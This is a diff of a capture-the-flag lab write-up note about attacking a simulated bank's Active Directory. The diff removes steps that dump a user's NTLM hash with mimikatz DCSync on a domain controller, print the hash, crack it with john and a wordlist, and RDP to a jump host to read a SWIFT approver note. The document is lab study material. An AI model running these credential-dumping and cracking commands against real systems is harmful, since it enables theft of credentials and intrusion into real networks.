@@ -24,33 +24,6 @@ Notice that there are two groups that we are interested in. Check out the users 
 ![[Enumerate users CAPTURERS and APPROVERS-20240619140440523.webp]]
 ![[Enumerate users CAPTURERS and APPROVERS-20240619140454701.webp]]
 
-## Dump NTLM hashes for these users
+**Next step:** [[SWIFT Web Capturer Access]]
 
-- [[Connect to CORPDC with Administration credentials]]
-- <span style="background:#d4b106">RDP to BANKDC with the [[Create user at BANK Forest|new user]].   </span> 
-- Open a Powershell on BANKDC as administrator.
-- Go to `c:\Users\Administrator.THERESERVE\Downloads`.
-- Run `mimikatz`.Password
-	-  # privilege::debug
-	-  # lsadump::dcsync /user:c.young
-		![[Enumerate users CAPTURERS and APPROVERS-20240621144300147.webp]]
-	 Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc
 
-### Cracking the hash on your attacking machine
-
-- Create a file with the hash.
-	$ `echo "fbdcd5041c96ddbd82224270b57f11fc" > ntlm_hash.c.young.txt`
-
-- Crack the hash with `john`.
-	$ `john --wordlist=/usr/share/wordlists/rockyou.txt  --format=NT ntlm_hash.c.young.txt` 
-	![[Enumerate users CAPTURERS and APPROVERS-20240621150830988.webp]]
-
-### RDP to JMP
-
-[[RDP to JMP]]
-
-Checking the folders contents you'll find a note for the approver.
-- Go to `C:\Users\a.holt\Documents\Swift`.
-- Open the swift file.
-	![[Enumerate users CAPTURERS and APPROVERS-20240621155345848.webp]]
-- 
